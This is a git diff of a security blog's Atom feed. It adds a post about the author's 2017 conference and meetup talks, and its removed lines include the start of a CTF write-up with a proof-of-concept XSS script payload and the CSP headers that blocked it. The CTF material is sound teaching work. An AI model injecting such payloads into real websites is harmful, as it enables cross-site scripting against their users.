@@ -1,4 +1,128 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en_GB"><generator uri="https://jekyllrb.com/" version="3.4.5">Jekyll</generator><link href="http://devalias.net/feed.xml" rel="self" type="application/atom+xml" /><link href="http://devalias.net/" rel="alternate" type="text/html" hreflang="en_GB" /><updated>2017-11-30T08:11:25+11:00</updated><id>http://devalias.net/</id><title type="html">/dev/alias – Hack. Dev. Transcend.</title><subtitle>Follow me into the rabbit hole that is my mind and learn about topics including.. security, technology, efficiency, biohacking, health, personal growth and probably a whole lot more.</subtitle><entry><title type="html">Squiz Matrix: Multiple vulnerabilities</title><link href="http://devalias.net/devalias/2017/09/07/squiz-matrix-multiple-vulnerabilities/" rel="alternate" type="text/html" title="Squiz Matrix: Multiple vulnerabilities" /><published>2017-09-07T00:00:00+10:00</published><updated>2017-09-07T00:00:00+10:00</updated><id>http://devalias.net/devalias/2017/09/07/squiz-matrix-multiple-vulnerabilities</id><content type="html" xml:base="http://devalias.net/devalias/2017/09/07/squiz-matrix-multiple-vulnerabilities/">&lt;p&gt;Earlier this year I had an opportunity to spend some time looking at &lt;a href=&quot;https://www.squiz.net/technology/cms&quot;&gt;Squiz Matrix&lt;/a&gt;, a Content Management System (CMS) used across a number of sectors including higher eduction, media and publishing, goverment, finance, health, and utilities. With a huge number of features, a massive PHP codebase, and a numbr of high profile sectors as clients, I set out to see if I could find any interesting little bugs hidden away.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en_GB"><generator uri="https://jekyllrb.com/" version="3.4.5">Jekyll</generator><link href="http://devalias.net/feed.xml" rel="self" type="application/atom+xml" /><link href="http://devalias.net/" rel="alternate" type="text/html" hreflang="en_GB" /><updated>2017-12-03T13:30:51+11:00</updated><id>http://devalias.net/</id><title type="html">/dev/alias – Hack. Dev. Transcend.</title><subtitle>Follow me into the rabbit hole that is my mind and learn about topics including.. security, technology, efficiency, biohacking, health, personal growth and probably a whole lot more.</subtitle><entry><title type="html">Presenting all the things! (BSides Wellington, CSides Canberra, SecTalks Canberra)</title><link href="http://devalias.net/devalias/2017/11/19/presenting-all-the-things-bsides-wellington-csides-sectalks/" rel="alternate" type="text/html" title="Presenting all the things! (BSides Wellington, CSides Canberra, SecTalks Canberra)" /><published>2017-11-19T00:00:00+11:00</published><updated>2017-11-19T00:00:00+11:00</updated><id>http://devalias.net/devalias/2017/11/19/presenting-all-the-things-bsides-wellington-csides-sectalks</id><content type="html" xml:base="http://devalias.net/devalias/2017/11/19/presenting-all-the-things-bsides-wellington-csides-sectalks/">&lt;p&gt;Recently I had the opportunity to present at a few local security meetups, and one international security conference.&lt;/p&gt;
+
+&lt;p&gt;At the start of 2017, I set a loose goal in the back of my mind that I would like to &amp;quot;get out there more&amp;quot; and &amp;quot;speak about the things I do&amp;quot;. Little did I know at the time that this would actually eventuate; leading to me having a pile of great experiences, and meeting some really cool and talented people!&lt;/p&gt;
+
+&lt;h2&gt;TL;DR&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;http://www.sectalks.org/canberra/&quot;&gt;SecTalks Canberra&lt;/a&gt; (&lt;a href=&quot;https://www.meetup.com/SecTalks-Canberra/events/241579721/&quot;&gt;November 14th, 2017; Canberra, Australia&lt;/a&gt;)
+
+&lt;ul&gt;
+&lt;li&gt;&amp;quot;Hack FaaSter: Leveraging Docker and OpenFaaS for fun and offensive (security) profit.&amp;quot;&lt;/li&gt;
+&lt;li&gt;Slides, workshop, etc: &lt;a href=&quot;https://github.com/0xdevalias/hack-FaaSter&quot;&gt;GitHub&lt;/a&gt; &lt;a href=&quot;https://github.com/0xdevalias/hack-FaaSter/blob/master/20171114%20-%20Hack%20FaaSter%20-%20SecTalks%20Canberra.pdf&quot;&gt;PDF&lt;/a&gt;, &lt;a href=&quot;https://speakerdeck.com/0xdevalias/hack-faaster-leveraging-docker-and-openfaas-for-fun-and-offensive-security-profit&quot;&gt;SpeakerDeck&lt;/a&gt;, &lt;a href=&quot;https://www.slideshare.net/GlenndevaliasGrant/hack-faaster-sectalks-canberra-20171114&quot;&gt;SlideShare&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://www.bsidesau.com.au/csides.html&quot;&gt;CSides Canberra&lt;/a&gt; (November 17th, 2017; Canberra, Australia)
+
+&lt;ul&gt;
+&lt;li&gt;&amp;quot;Gophers, whales and.. clouds? Oh my!&amp;quot; &lt;code&gt;v0.2-prewlg-alpha&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://www.bsides.nz/&quot;&gt;BSides Wellington 2017&lt;/a&gt; (November 23-24th, 2017; Wellington, New Zealand)
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://bsideswellington2017.sched.com/speaker/glenndevaliasgrant&quot;&gt;Speaker: Glenn &amp;#39;devalias&amp;#39; Grant&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://bsideswellington2017.sched.com/event/CTpF/gophers-whales-and-clouds-oh-my&quot;&gt;&amp;quot;Gophers, whales and.. clouds? Oh my!&amp;quot;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Slides, etc: &lt;a href=&quot;https://github.com/0xdevalias/gopherblazer&quot;&gt;GitHub&lt;/a&gt;, &lt;a href=&quot;https://github.com/0xdevalias/gopherblazer/blob/master/slides/20171123-Gopherblazer-BSidesWellington.pdf&quot;&gt;PDF&lt;/a&gt;, &lt;a href=&quot;https://speakerdeck.com/0xdevalias/gophers-whales-and-dot-clouds-oh-my&quot;&gt;SpeakerDeck&lt;/a&gt;, &lt;a href=&quot;https://www.slideshare.net/GlenndevaliasGrant/gophers-whales-and-clouds-oh-my&quot;&gt;SlideShare&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2&gt;SecTalks Canberra&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://www.sectalks.org/canberra/&quot;&gt;SecTalks Canberra&lt;/a&gt; is a monthly security meetup with more of a focus on participation and learning from others, rather than the traditional &amp;#39;super awesome technical talk but how do I do it&amp;#39; style of things.&lt;/p&gt;
+
+&lt;p&gt;I had the opportunity to run a little workshop on how to use &lt;a href=&quot;https://www.docker.com/&quot;&gt;Docker&lt;/a&gt; and &lt;a href=&quot;https://www.openfaas.com/&quot;&gt;OpenFaaS&lt;/a&gt; to improve offensive capabilities.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Hack FaaSter: Leveraging Docker and OpenFaaS for fun and offensive (security) profit.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Slides, workshop files and more details are available from the &amp;#39;TL;DR&amp;#39; section above.&lt;/p&gt;
+
+&lt;p&gt;Description:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Join us this month for Hack FaaSter - leveraging &lt;a href=&quot;https://www.docker.com/&quot;&gt;Docker&lt;/a&gt; and &lt;a href=&quot;https://www.openfaas.com/&quot;&gt;OpenFaaS&lt;/a&gt; to improve offensive tooling, with the glorious &lt;a href=&quot;https://twitter.com/_devalias&quot;&gt;@_devalias&lt;/a&gt; (&lt;a href=&quot;https://github.com/0xdevalias&quot;&gt;Github&lt;/a&gt; // &lt;a href=&quot;https://www.linkedin.com/in/glenn-devalias-grant/&quot;&gt;LinkedIn&lt;/a&gt;)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2&gt;CSides Canberra&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://www.bsidesau.com.au/csides.html&quot;&gt;CSides Canberra&lt;/a&gt; is a monthly security meetup run by the organisers of &lt;a href=&quot;http://www.bsidesau.com.au/&quot;&gt;BSides Canberra&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;I had the opportunity to present a &lt;code&gt;v0.2-prewlg-alpha&lt;/code&gt; version of my BSides Wellington talk, and get some practice and feedback in before the big thing.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Gophers, whales and.. clouds? Oh my! (v0.2-prewlg-alpha)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Slides and more details are available from the &amp;#39;TL;DR&amp;#39; section above, as well as the BSides Wellington section below.&lt;/p&gt;
+
+&lt;h2&gt;BSides Wellington&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.bsides.nz/&quot;&gt;BSides Wellington&lt;/a&gt; (&lt;a href=&quot;https://twitter.com/bsideswlg&quot;&gt;Twitter&lt;/a&gt;) is an annual security conference (based in Wellington, New Zealand) that ran it&amp;#39;s first event in 2017. Popping up to fill the void left by &lt;a href=&quot;https://www.kiwicon.org/&quot;&gt;Kiwicon&lt;/a&gt; (&lt;a href=&quot;https://twitter.com/kiwicon&quot;&gt;Twitter&lt;/a&gt;), they had a strong first event, and hopefully will continue that trend into the future!&lt;/p&gt;
+
+&lt;p&gt;I had the opportunity to present my talk on leveraging DevOps trends and tools (&lt;a href=&quot;https://www.docker.com/&quot;&gt;Docker&lt;/a&gt;, &lt;a href=&quot;https://en.wikipedia.org/wiki/Serverless_computing&quot;&gt;Serverless&lt;/a&gt;, &lt;a href=&quot;https://en.wikipedia.org/wiki/Function_as_a_service&quot;&gt;FaaS&lt;/a&gt;, &lt;a href=&quot;https://golang.org/&quot;&gt;Golang&lt;/a&gt;, etc), to increase my efficiency and effectiveness on the offensive side.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Gophers, whales and.. clouds? Oh my!&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Slides and more details are available from the &amp;#39;TL;DR&amp;#39; section above.&lt;/p&gt;
+
+&lt;p&gt;You can read the &lt;a href=&quot;https://bsideswellington2017.sched.com/event/CTpF/gophers-whales-and-clouds-oh-my&quot;&gt;official brief of my talk&lt;/a&gt;:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Go, Docker and Microservices; some great technologies and buzzwords that we hear so much about on the development side of the fence, but how can we leverage these technologies to improve our offensive capacity? Armed with a passion for new tech, a vague theory, and an ‘nsa-o-matic’ approved project name; gopherblazer was born.&lt;/p&gt;
+
+&lt;p&gt;Whether through dockerising and improving existing tooling, leveraging Function-as-a-Service (FaaS) offerings, or just distributing offensive capabilities; I’ll share what I learned on my journey into improving my offensive capacity and productivity (while having an excuse to play with shiny technologies along the way!).&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;And I can even now say that I have a &lt;a href=&quot;https://bsideswellington2017.sched.com/speaker/glenndevaliasgrant&quot;&gt;professional speaker bio&lt;/a&gt;:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Glenn ‘devalias’ Grant is a full-stack, polyglot developer with an acute interest in the offensive side of security. Whether building something new or finding the cracks to break in, there is always a solution to be found; even if it requires learning something entirely new. If you can improve/automate something, do it, and if you’ve put the effort in to do so, open-source it and share it with everyone else.&lt;/p&gt;
+
+&lt;p&gt;When not hacking and coding, Glenn can be found snowboarding the peaks of Japan, falling out of the sky, floating around underwater, or just finding the most efficient path between A and B (even if that’s over walls). Life is short. Do the things you love, embrace the unknown, live your dreams, and share your passion.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Overall, the conference was amazing. As expected, there were a number of deeply interesting technical talks, but as a bit of a twist from traditional security conferences, there were quite a few talks that focussed on mental health, impostor syndrome, and other &amp;#39;culture based&amp;#39; topics that so often go unmentioned in the infosec industry. Very much appreciated and would love to see this sort of thing happen at more conferences in future.&lt;/p&gt;
+
+&lt;p&gt;If you missed the talks, or want to go back and re-watch them, videos should be posted online at some point (once the organisers recover from running the conference). A lot of the presenters also seem to be pushing their slides/content out online. Here&amp;#39;s a selection of the few I&amp;#39;ve stumbled across so far (in no particular order):&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://github.com/0xdevalias/gopherblazer#talks&quot;&gt;Glenn &amp;#39;devalias&amp;#39; Grant, &amp;quot;Gophers, whales and.. clouds? Oh my!&amp;quot;&lt;/a&gt; (&lt;a href=&quot;blockquote%20class=%22twitter-tweet%22%3E%3Cp%20lang=%22en%22%20dir=%22ltr%22%3ESlides%20from%20my%20%3Ca%20href=%22https://twitter.com/hashtag/bsideswlg?src=hash&amp;amp;ref_src=twsrc%5Etfw%22%3E#bsideswlg%3C/a%3E%20talk%20are%20now%20pushed%20to%20%3Ca%20href=%22https://twitter.com/speakerdeck?ref_src=twsrc%5Etfw%22%3E@speakerdeck%3C/a%3E%20and%20%3Ca%20href=%22https://twitter.com/SlideShare?ref_src=twsrc%5Etfw%22%3E@SlideShare%3C/a%3E%20for%20your%20viewing%20pleasure.%20See%20links%20at%20%3Ca%20href=%22https://t.co/Iu1UBGhGSa%22%3Ehttps://t.co/Iu1UBGhGSa%3C/a%3E%3C/p%3E&amp;mdash;%20Glenn%20/%20devalias%20(@_devalias)%20%3Ca%20href=%22https://twitter.com/_devalias/status/937104594974289920?ref_src=twsrc%5Etfw%22%3EDecember%202,%202017%3C/a%3E%3C/blockquote%3E%0A%3Cscript%20async%20src=%22https://platform.twitter.com/widgets.js%22%20charset=%22utf-8%22%3E%3C/script&quot;&gt;Twitter&lt;/a&gt;)&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://speakerdeck.com/barnbarn/layer-2-person-spoofing-and-impostor-syndrome&quot;&gt;Ben Hughes, &amp;quot;Layer 2 person spoofing and impostor syndrome&amp;quot;&lt;/a&gt; (&lt;a href=&quot;blockquote%20class=%22twitter-tweet%22%3E%3Cp%20lang=%22en%22%20dir=%22ltr%22%3EMy%20slides%20for%20&amp;quot;Layer%202%20person%20spoofing%20and%20impostor%20syndrome&amp;quot;%20for%20%3Ca%20href=%22https://twitter.com/hashtag/bsideswlg?src=hash&amp;amp;ref_src=twsrc%5Etfw%22%3E#bsideswlg%3C/a%3E%20are%20up%20at%20%3Ca%20href=%22https://t.co/hAbzSMsLmt%22%3Ehttps://t.co/hAbzSMsLmt%3C/a%3E%20thanks%20everyone%20who%20came%20along.%3C/p%3E&amp;mdash;%20Ben%20Hughes%20(@benjammingh)%20%3Ca%20href=%22https://twitter.com/benjammingh/status/933484211977166848?ref_src=twsrc%5Etfw%22%3ENovember%2022,%202017%3C/a%3E%3C/blockquote%3E%0A%3Cscript%20async%20src=%22https://platform.twitter.com/widgets.js%22%20charset=%22utf-8%22%3E%3C/script&quot;&gt;Twitter&lt;/a&gt;)&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://speakerdeck.com/heisenburger/design-for-security-bsides-wellington-2017&quot;&gt;Serena Chen, &amp;quot;Design for Security — BSides Wellington 2017&amp;quot;&lt;/a&gt; (&lt;a href=&quot;blockquote%20class=%22twitter-tweet%22%3E%3Cp%20lang=%22en%22%20dir=%22ltr%22%3E%F0%9F%90%9D%F0%9F%90%9D%F0%9F%90%9D%20hey%20%3Ca%20href=%22https://twitter.com/hashtag/bsideswlg?src=hash&amp;amp;ref_src=twsrc%5Etfw%22%3E#bsideswlg%3C/a%3E%20fam,%20I%20finally%20uploaded%20my%20slides%20from%20my%20design%20for%20security%20talk:%20%3Ca%20href=%22https://t.co/K4wWWeciJM%22%3Ehttps://t.co/K4wWWeciJM%3C/a%3E%20Thanks%20so%20much%20for%20coming%20along!%20%F0%9F%98%8A%3C/p%3E&amp;mdash;%20%F0%9F%8C%99%20serena%20chen%20%F0%9F%92%AB%20(@Sereeena)%20%3Ca%20href=%22https://twitter.com/Sereeena/status/935208350207356930?ref_src=twsrc%5Etfw%22%3ENovember%2027,%202017%3C/a%3E%3C/blockquote%3E%0A%3Cscript%20async%20src=%22https://platform.twitter.com/widgets.js%22%20charset=%22utf-8%22%3E%3C/script&quot;&gt;Twitter&lt;/a&gt;)&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://mango.pdf.zone/operation-luigi-how-i-hacked-my-friend-without-her-noticing&quot;&gt;&amp;quot;Alex&amp;quot;, &amp;quot;Operation Luigi: How I hacked my friend without her noticing&amp;quot;&lt;/a&gt; (&lt;a href=&quot;blockquote%20class=%22twitter-tweet%22%3E%3Cp%20lang=%22en%22%20dir=%22ltr%22%3EHey%20everybody%20welcome%20to%20Operation%20Luigi,%20where%20my%20friend%20gave%20me%20permission%20to%20try%20to%20hack%20all%20her%20stuff.%20This%20is%20what%20I%20did,%20how%20I%20did%20it,%20and%20how%20to%20prevent%20it%20from%20working%20on%20you.%20Also%20at%20the%20end%20Mario&amp;#39;s%20good%20green%20brother%20is%20there%3Ca%20href=%22https://t.co/d7CZv9LGm5%22%3Ehttps://t.co/d7CZv9LGm5%3C/a%3E%3C/p%3E&amp;mdash;%20%E2%80%9CAlex%E2%80%9D%20(@mangopdf)%20%3Ca%20href=%22https://twitter.com/mangopdf/status/934897549554491394?ref_src=twsrc%5Etfw%22%3ENovember%2026,%202017%3C/a%3E%3C/blockquote%3E%0A%3Cscript%20async%20src=%22https://platform.twitter.com/widgets.js%22%20charset=%22utf-8%22%3E%3C/script&quot;&gt;Twitter&lt;/a&gt;)&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://github.com/jenofdoom/give-your-users-better-feedback-about-rubbish-passwords&quot;&gt;@jenofdoom, &amp;quot;Give your users better feedback about rubbish passwords with zxcvbn&amp;quot;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://zxsecurity.co.nz/presentations/201711_BSidesWLG-ZXSecurity_MeatPuppets.pdf&quot;&gt;Simon &amp;#39;bogan&amp;#39; Howard, &amp;quot;Influencing Meat
+Puppets Through
+Memes&amp;quot;&lt;/a&gt; (&lt;a href=&quot;blockquote%20class=%22twitter-tweet%22%3E%3Cp%20lang=%22en%22%20dir=%22ltr%22%3EThe%20slides%20from%20my%20%3Ca%20href=%22https://twitter.com/bsideswlg?ref_src=twsrc%5Etfw%22%3E@bsideswlg%3C/a%3E%20presentation%20on%20&amp;quot;Influencing%20Meat%20Puppets%20with%20Memes&amp;quot;%20are%20available%20here:%20%3Ca%20href=%22https://t.co/IRWsEmjseE%22%3Ehttps://t.co/IRWsEmjseE%3C/a%3E%3C/p%3E&amp;mdash;%20bogan%20(@bogan)%20%3Ca%20href=%22https://twitter.com/bogan/status/934896629135556608?ref_src=twsrc%5Etfw%22%3ENovember%2026,%202017%3C/a%3E%3C/blockquote%3E%0A%3Cscript%20async%20src=%22https://platform.twitter.com/widgets.js%22%20charset=%22utf-8%22%3E%3C/script&quot;&gt;Twitter&lt;/a&gt;)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;It looks like there are also some good summaries, notes and writeups of the conference popping up around the net. Some places to start looking:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://rodger.donaldson.gen.nz/archives/2017/11/b-sides-wellington-day-1/&quot;&gt;B-Sides Wellington - Day 1 (Notes)&lt;/a&gt; (&lt;a href=&quot;blockquote%20class=%22twitter-tweet%22%3E%3Cp%20lang=%22en%22%20dir=%22ltr%22%3EMy%20notes%20on%20day%20one%20of%20the%20fabulous%20%3Ca%20href=%22https://twitter.com/hashtag/bsideswlg?src=hash&amp;amp;ref_src=twsrc%5Etfw%22%3E#bsideswlg%3C/a%3E%20%3Ca%20href=%22https://t.co/5IABHBjr8G%22%3Ehttps://t.co/5IABHBjr8G%3C/a%3E%3C/p%3E&amp;mdash;%20Nazi%20Tweeps%20Fuck%20Off%20(@hroethgar)%20%3Ca%20href=%22https://twitter.com/hroethgar/status/933620066129625090?ref_src=twsrc%5Etfw%22%3ENovember%2023,%202017%3C/a%3E%3C/blockquote%3E%0A%3Cscript%20async%20src=%22https://platform.twitter.com/widgets.js%22%20charset=%22utf-8%22%3E%3C/script&quot;&gt;Twitter&lt;/a&gt;)
+
+&lt;ul&gt;
+&lt;li&gt;My Talk: &lt;a href=&quot;https://rodger.donaldson.gen.nz/archives/2017/11/b-sides-wellington-day-1/#gophers-whales-and-clouds-oh-my&quot;&gt;Gophers, whales, and clouds? Oh my.&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://rodger.donaldson.gen.nz/archives/2017/11/b-sides-wellington-day-2/&quot;&gt;B-Sides Wellington - Day 2 (Notes)&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://www.asinine.nz/2017-11-25/bsides-badge-part1/&quot;&gt;BSides Wellington Badge Challenge&lt;/a&gt; (&lt;a href=&quot;blockquote%20class=%22twitter-tweet%22%3E%3Cp%20lang=%22en%22%20dir=%22ltr%22%3EA%20write%20up%20of%20the%20%3Ca%20href=%22https://twitter.com/hashtag/bsidesWLG?src=hash&amp;amp;ref_src=twsrc%5Etfw%22%3E#bsidesWLG%3C/a%3E%20badge%20challenge.%20%3Ca%20href=%22https://twitter.com/bsideswlg?ref_src=twsrc%5Etfw%22%3E@bsideswlg%3C/a%3E%20%3Ca%20href=%22https://t.co/XC8tqAuOor%22%3Ehttps://t.co/XC8tqAuOor%3C/a%3E%3C/p%3E&amp;mdash;%20Derek%20Robson%20(@asinine_net_nz)%20%3Ca%20href=%22https://twitter.com/asinine_net_nz/status/934592555253039104?ref_src=twsrc%5Etfw%22%3ENovember%2026,%202017%3C/a%3E%3C/blockquote%3E%0A%3Cscript%20async%20src=%22https://platform.twitter.com/widgets.js%22%20charset=%22utf-8%22%3E%3C/script&quot;&gt;Twitter&lt;/a&gt;)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;And of course, Twitter is always full of content when it comes to the security industry, with 3 hashtags mainly being used throughout the conference:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://twitter.com/search?q=%23bsideswlg&amp;src=typd&quot;&gt;#bsideswlg&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://twitter.com/search?q=%23bsideswlg2017&amp;src=typd&quot;&gt;#bsideswlg2017&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://twitter.com/search?q=%23bsidesnz&amp;src=typd&quot;&gt;#bsidesnz&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;While at times I was definitely feeling the stress and pressure of having a few looming deadlines, and at times possibly not allocating enough time/energy/focus to working on them as I would have liked, it has been a great experience, and left a smouldering flame of passion to speak at more events in the future.&lt;/p&gt;
+
+&lt;p&gt;Know of any other writeups, slides or tools; or got a cool story to share from BSides Wellington? Would love to hear from you in the comments!&lt;/p&gt;</content><author><name>Glenn 'devalias' Grant</name></author><category term="security" /><category term="speaker" /><category term="workshop" /><category term="bsides" /><category term="bsideswlg" /><category term="csidescbr" /><category term="sectalks" /><summary type="html">Recently I had the opportunity to present at a few local security meetups, and one international security conference.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://devalias.net/assets/images/cover4.jpg" /></entry><entry><title type="html">Squiz Matrix: Multiple vulnerabilities</title><link href="http://devalias.net/devalias/2017/09/07/squiz-matrix-multiple-vulnerabilities/" rel="alternate" type="text/html" title="Squiz Matrix: Multiple vulnerabilities" /><published>2017-09-07T00:00:00+10:00</published><updated>2017-09-07T00:00:00+10:00</updated><id>http://devalias.net/devalias/2017/09/07/squiz-matrix-multiple-vulnerabilities</id><content type="html" xml:base="http://devalias.net/devalias/2017/09/07/squiz-matrix-multiple-vulnerabilities/">&lt;p&gt;Earlier this year I had an opportunity to spend some time looking at &lt;a href=&quot;https://www.squiz.net/technology/cms&quot;&gt;Squiz Matrix&lt;/a&gt;, a Content Management System (CMS) used across a number of sectors including higher eduction, media and publishing, goverment, finance, health, and utilities. With a huge number of features, a massive PHP codebase, and a numbr of high profile sectors as clients, I set out to see if I could find any interesting little bugs hidden away.&lt;/p&gt;
 
 &lt;p&gt;While I won&amp;#39;t get into the nitty gritty of most of the assessment process, I did find some things, and 3 CVE&amp;#39;s were assigned (detailed below). One was interesting enough that I will probably write up the process in more detail at some point.&lt;/p&gt;
 
@@ -2249,168 +2373,4 @@ In a fast, simple, yet extensible way.&lt;/li&gt;
 &lt;/ul&gt;&lt;/li&gt;
 &lt;li&gt;21:00 Golden Ticket: &lt;a href=&quot;http://bulletproofconference.com&quot;&gt;2016 Bulletproof Conference Pass (incl +1)&lt;/a&gt; (US$1500)&lt;/li&gt;
 &lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>Glenn 'devalias' Grant</name></author><category term="quicknote" /><category term="bulletproof" /><category term="bulletproof-quarterly" /><category term="dave-asprey" /><category term="quarterly" /><category term="biohacking" /><summary type="html">So it&amp;#39;s that time again where biohacking christmas comes early (4 times a year!) Before I get into the content from this box, it seems Dave and the team have decided to move on from Quarterly and give the biohacking box a new home on biohacked.com. So if you want to find it, make sure you head over there and sign up!</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://devalias.net/assets/images/cover4.jpg" /></entry><entry><title type="html">CTF Snippets: XSS.gif</title><link href="http://devalias.net/devalias/2016/09/16/ctf-snippets-xss-gif/" rel="alternate" type="text/html" title="CTF Snippets: XSS.gif" /><published>2016-09-16T00:00:00+10:00</published><updated>2016-09-16T00:00:00+10:00</updated><id>http://devalias.net/devalias/2016/09/16/ctf-snippets-xss-gif</id><content type="html" xml:base="http://devalias.net/devalias/2016/09/16/ctf-snippets-xss-gif/">&lt;p&gt;I was playing around with the top challenge on the CTF at &lt;a href=&quot;http://www.sectalks.org/canberra/&quot;&gt;SecTalks&lt;/a&gt; the other night, and thought I&amp;#39;d do a quick writeup of some of the techniques required; for future reference, and to help others to learn.&lt;/p&gt;
-
-&lt;h2&gt;Hack the gibso.. Website&lt;/h2&gt;
-
-&lt;p&gt;To start off, we were given a URL to a website that looked like a pretty standard sort of blog. Features included things like account registration/login, avatar upload, messaging between users, search, posts (not by a standard account), comments on posts (standard account), showing online users, etc. And the &lt;code&gt;administrator&lt;/code&gt; was online.. interesting.&lt;/p&gt;
-
-&lt;p&gt;Poking around at things, I discovered that the messaging system didn&amp;#39;t seem to filter out HTML from the subject/message body. Easy! (or so I thought) I put together a super basic PoC XSS payload and tried it out by sending a message to my own account:&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'XSS'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;I checked the message.. but for some reason it didn&amp;#39;t pop, even though my payload seemed fine in the source. :(&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;well&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'XSS'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;Looking at the developer console gave me some more insight. Apparently this site had &lt;a href=&quot;https://en.wikipedia.org/wiki/Content_Security_Policy&quot;&gt;Content Security Policy&lt;/a&gt; enabled, and it was blocking my payload.&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;Refused to execute inline script because it violates the following Content Security Policy directive: &amp;quot;script-src &amp;#39;self&amp;#39;&amp;quot;. Either the &amp;#39;unsafe-inline&amp;#39; keyword, a hash (&amp;#39;sha256-kNShxzU0TYI8w1bsujgbPcQ4oIISMT9erFfdwx1ma+M=&amp;#39;), or a nonce (&amp;#39;nonce-...&amp;#39;) is required to enable inline execution.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Probably should have noticed those headers earlier.. Oh well, now to find a way around them. With spacing added for readability, the headers looked like:&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;Content-Security-Policy:
-  default-src 'none';
-  img-src 'self' placehold.it *.imgix.net;
-  script-src 'self';
-  connect-src 'self';
-  style-src 'self' fonts.gstatic.com fonts.googleapis.com;
-  font-src 'self' fonts.googleapis.com fonts.gstatic.com;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
